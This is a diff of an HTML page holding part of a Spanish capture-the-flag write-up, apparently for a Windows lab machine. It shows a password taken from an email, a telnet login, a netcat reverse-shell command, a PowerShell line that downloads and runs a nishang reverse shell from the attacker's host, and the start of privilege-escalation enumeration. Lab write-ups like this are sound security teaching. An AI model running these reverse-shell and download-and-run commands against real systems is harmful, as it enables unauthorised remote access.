+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>	boundary=<span style="color:#0ff;font-weight:bold">&#34;--boundary-LibPST-iamunique-1304609787_-_-&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>----boundary-LibPST-iamunique-1304609787_-_-
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>Content-Type: multipart/alternative;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>	boundary=<span style="color:#0ff;font-weight:bold">&#34;alt---boundary-LibPST-iamunique-1304609787_-_-&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>--alt---boundary-LibPST-iamunique-1304609787_-_-
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>Content-Type: text/plain; charset=<span style="color:#0ff;font-weight:bold">&#34;utf-8&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>Hi there,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span> 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>The password <span style="color:#fff;font-weight:bold">for</span> the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span> 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>Regards,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>John
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>--alt---boundary-LibPST-iamunique-1304609787_-_-
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>Content-Type: text/html; charset=<span style="color:#0ff;font-weight:bold">&#34;us-ascii&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>&lt;html xmlns:v=<span style="color:#0ff;font-weight:bold">&#34;urn:schemas-microsoft-com:vml&#34;</span> xmlns:o=<span style="color:#0ff;font-weight:bold">&#34;urn:schemas-microsoft-com:office:office&#34;</span> xmlns:w=<span style="color:#0ff;font-weight:bold">&#34;urn:schemas-microsoft-com:office:word&#34;</span> xmlns:m=<span style="color:#0ff;font-weight:bold">&#34;http://schemas.microsoft.com/office/2004/12/omml&#34;</span> xmlns=<span style="color:#0ff;font-weight:bold">&#34;http://www.w3.org/TR/REC-html40&#34;</span>&gt;&lt;head&gt;&lt;meta http-equiv=Content-Type content=<span style="color:#0ff;font-weight:bold">&#34;text/html; charset=us-ascii&#34;</span>&gt;&lt;meta name=Generator content=<span style="color:#0ff;font-weight:bold">&#34;Microsoft Word 15 (filtered medium)&#34;</span>&gt;&lt;style&gt;&lt;!--
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>/* Font Definitions */
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>@font-face
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>	{font-family:<span style="color:#0ff;font-weight:bold">&#34;Cambria Math&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>	panose-1:0 <span style="color:#ff0;font-weight:bold">0</span> <span style="color:#ff0;font-weight:bold">0</span> <span style="color:#ff0;font-weight:bold">0</span> <span style="color:#ff0;font-weight:bold">0</span> <span style="color:#ff0;font-weight:bold">0</span> <span style="color:#ff0;font-weight:bold">0</span> <span style="color:#ff0;font-weight:bold">0</span> <span style="color:#ff0;font-weight:bold">0</span> 0;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>@font-face
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>	{font-family:Calibri;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>	panose-1:2 <span style="color:#ff0;font-weight:bold">15</span> <span style="color:#ff0;font-weight:bold">5</span> <span style="color:#ff0;font-weight:bold">2</span> <span style="color:#ff0;font-weight:bold">2</span> <span style="color:#ff0;font-weight:bold">2</span> <span style="color:#ff0;font-weight:bold">4</span> <span style="color:#ff0;font-weight:bold">3</span> <span style="color:#ff0;font-weight:bold">2</span> 4;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>/* Style Definitions */
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>p.MsoNormal, li.MsoNormal, div.MsoNormal
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>	{margin:0in;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47</span><span>	margin-bottom:.0001pt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48</span><span>	font-size:11.0pt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49</span><span>	font-family:<span style="color:#0ff;font-weight:bold">&#34;Calibri&#34;</span>,sans-serif;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50</span><span>a:link, span.MsoHyperlink
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51</span><span>	{mso-style-priority:99;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52</span><span>	color:#0563C1;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">53</span><span>	text-decoration:underline;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">54</span><span>a:visited, span.MsoHyperlinkFollowed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">55</span><span>	{mso-style-priority:99;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">56</span><span>	color:#954F72;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">57</span><span>	text-decoration:underline;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">58</span><span>p.msonormal0, li.msonormal0, div.msonormal0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">59</span><span>	{mso-style-name:msonormal;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">60</span><span>	mso-margin-top-alt:auto;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">61</span><span>	margin-right:0in;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">62</span><span>	mso-margin-bottom-alt:auto;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">63</span><span>	margin-left:0in;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">64</span><span>	font-size:11.0pt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">65</span><span>	font-family:<span style="color:#0ff;font-weight:bold">&#34;Calibri&#34;</span>,sans-serif;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">66</span><span>span.EmailStyle18
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">67</span><span>	{mso-style-type:personal-compose;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">68</span><span>	font-family:<span style="color:#0ff;font-weight:bold">&#34;Calibri&#34;</span>,sans-serif;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">69</span><span>	color:windowtext;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">70</span><span>.MsoChpDefault
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">71</span><span>	{mso-style-type:export-only;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">72</span><span>	font-size:10.0pt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">73</span><span>	font-family:<span style="color:#0ff;font-weight:bold">&#34;Calibri&#34;</span>,sans-serif;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">74</span><span>@page WordSection1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">75</span><span>	{size:8.5in 11.0in;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">76</span><span>	margin:1.0in 1.0in 1.0in 1.0in;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">77</span><span>div.WordSection1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">78</span><span>	{page:WordSection1;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">79</span><span>--&gt;&lt;/style&gt;&lt;!--[<span style="color:#fff;font-weight:bold">if</span> gte mso 9]&gt;&lt;xml&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">80</span><span>&lt;o:shapedefaults v:ext=<span style="color:#0ff;font-weight:bold">&#34;edit&#34;</span> spidmax=<span style="color:#0ff;font-weight:bold">&#34;1026&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">81</span><span>&lt;/xml&gt;&lt;![endif]--&gt;&lt;!--[<span style="color:#fff;font-weight:bold">if</span> gte mso 9]&gt;&lt;xml&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">82</span><span>&lt;o:shapelayout v:ext=<span style="color:#0ff;font-weight:bold">&#34;edit&#34;</span>&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">83</span><span>&lt;o:idmap v:ext=<span style="color:#0ff;font-weight:bold">&#34;edit&#34;</span> data=<span style="color:#0ff;font-weight:bold">&#34;1&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">84</span><span>&lt;/o:shapelayout&gt;&lt;/xml&gt;&lt;![endif]--&gt;&lt;/head&gt;&lt;body lang=EN-US link=<span style="color:#0ff;font-weight:bold">&#34;#0563C1&#34;</span> vlink=<span style="color:#0ff;font-weight:bold">&#34;#954F72&#34;</span>&gt;&lt;div class=WordSection1&gt;&lt;p class=MsoNormal&gt;Hi there,&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;The password <span style="color:#fff;font-weight:bold">for</span> the &amp;<span style="color:#007f7f">#8220;security&amp;#8221; account has been changed to 4Cc3ssC0ntr0ller.&amp;nbsp; Please ensure this is passed on to your engineers.&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;Regards,&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=MsoNormal&gt;John&lt;o:p&gt;&lt;/o:p&gt;&lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">85</span><span>--alt---boundary-LibPST-iamunique-1304609787_-_---
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">86</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">87</span><span>----boundary-LibPST-iamunique-1304609787_-_---</span></span></code></pre></div>
+<p>Podemos leer una credencial de este archivo.
 <code>security:4Cc3ssC0ntr0ller</code></p>
 <p>Ahora, si nos conectamos por telnet y esperamos un poco, nos responderá pidiendo un usuario y contraseña y podemos iniciar sesión como el usuario <code>security</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>login:security        
-</span></span><span style="display:flex;"><span>password: 
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>*<span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>Microsoft Telnet Server.
-</span></span><span style="display:flex;"><span>*<span style="color:#f92672">===============================================================</span>
-</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>ecurity&gt;
-</span></span></code></pre></div><p>Esta shell de telnet no funciona de forma óptima, así que me pasé el binario de <code>netcat</code> para mandarme una reverse shell pero&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\security<span style="color:#75715e">&gt;.\nc.exe 10.10.14.80 443 -e cmd.exe</span>
-</span></span><span style="display:flex;"><span>This program is blocked by group policy. For more information, contact your system administrator.
-</span></span></code></pre></div><p>Así que me transmití el típico script de nishang, <code>Invoke-PowerShellTcp.ps1</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>login:security        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>*===============================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>Microsoft Telnet Server.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>*===============================================================
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>C:<span style="color:#0ff;font-weight:bold">\U</span>sers<span style="color:#0ff;font-weight:bold">\s</span>ecurity&gt;</span></span></code></pre></div>
+<p>Esta shell de telnet no funciona de forma óptima, así que me pasé el binario de <code>netcat</code> para mandarme una reverse shell pero&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Users\security<span style="color:#007f7f">&gt;.\nc.exe 10.10.14.80 443 -e cmd.exe</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>This program is blocked by group policy. For more information, contact your system administrator.</span></span></code></pre></div>
+<p>Así que me transmití el típico script de nishang, <code>Invoke-PowerShellTcp.ps1</code></p>
 <p>Modifiqué el script añadiendo la línea <code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.80 -Port 443</code> al final del archivo.</p>
 <p>Y ahora, nos mandamos la revshell..</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:\Users\security<span style="color:#75715e">&gt;powershell -c IEX (New-Object Net.Webclient).DownloadString(&#39;http://10.10.14.80:8081/Invoke-PowerShellTcp.ps1&#39;)</span>
-</span></span></code></pre></div><p>Y ya estamos en una consola mas fácil para operar</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\security&gt; whoami
-</span></span><span style="display:flex;"><span>access\security
-</span></span><span style="display:flex;"><span>PS C:\Users\security&gt;
-</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>C:\Users\security<span style="color:#007f7f">&gt;powershell -c IEX (New-Object Net.Webclient).DownloadString(&#39;http://10.10.14.80:8081/Invoke-PowerShellTcp.ps1&#39;)</span></span></span></code></pre></div>
+<p>Y ya estamos en una consola mas fácil para operar</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Users\security&gt; whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>access\security
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#fff;font-weight:bold">PS </span>C:\Users\security&gt;</span></span></code></pre></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
 <p>Iba a pasar el <code>winpeas</code> pero no tenía permisos suficientes ya que parece que hay una GPO que no me lo permite.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\security&gt; .\winPEASx64.exe 
-</span></span><span style="display:flex;"><span>PS C:\Users\security&gt; Invoke-PowerShellTcp <span style="color:#960050;background-color:#1e0010">:</span> Program <span style="color:#e6db74">&#39;winPEASx64.exe&#39;</span> failed to execute<span style="color:#960050;background-color:#1e0010">:</span> This program is blocked by group policy. <span style="color:#66d9ef">For</span> more information, contact your system administrator
-</span></span><span style="display:flex;"><span>At line<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span> char<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">17</span>
-</span></span><span style="display:flex;"><span>+ .\winPEASx64.exe &lt;&lt;&lt;&lt;  .
-</span></span><span style="display:flex;"><span>At line<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">128</span> char<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">21</span>
-</span></span><span style="display:flex;"><span>+ Invoke-PowerShellTcp &lt;&lt;&lt;&lt;  -Reverse -IPAddress <span style="color:#ae81ff">10.10</span>.14.80 -Port <span style="color:#ae81ff">443</span>
-</span></span><span style="display:flex;"><span>    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> NotSpecified<span style="color:#960050;background-color:#1e0010">:</span> (<span style="color:#960050;background-color:#1e0010">:</span>) [Write-Error], WriteErrorException
-</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> Microsoft.PowerShell.Commands.WriteErrorException,Invoke-PowerShellTcp
-</span></span></code></pre></div><p>Enumerando un poco la máquina manualmente, vemos que en el escritorio del usuario público hay un acceso directo.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\USers\Public\Desktop&gt; dir
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\USers\Public\Desktop
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Mode                LastWriteTime     Length Name                                                                                                                                            
-</span></span><span style="display:flex;"><span>----                -------------     ------ ----                                                                                                                                            
-</span></span><span style="display:flex;"><span>-a---         <span style="color:#ae81ff">8</span>/<span style="color:#ae81ff">22</span>/<span style="color:#ae81ff">2018</span>  <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">18</span> PM       <span style="color:#ae81ff">1870</span> ZKAccess3.5 Security System.lnk
-</span></span></code></pre></div><p>Siempre es interesante echar un vistazo a los accesos directos ya que a veces la secuencia de ejecución contiene credenciales, o se pueden ver cosas que no deberían estas.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\USers\Public\Desktop&gt; type <span style="color:#e6db74">&#34;ZKAccess3.5 Security System.lnk&#34;</span>
-</span></span><span style="display:flex;"><span>L<span style="color:#66d9ef">?</span>F?@ ?<span style="color:#66d9ef">?</span><span style="color:#ae81ff">7</span>??<span style="color:#66d9ef">?</span><span style="color:#ae81ff">7</span>???<span style="color:#75715e">#?P/P?O? ?:i?+00?/C:\R1M?:Windows???:?�M?:*wWindowsV1MV?System32???:?�MV?*?System32X2P?:?</span>
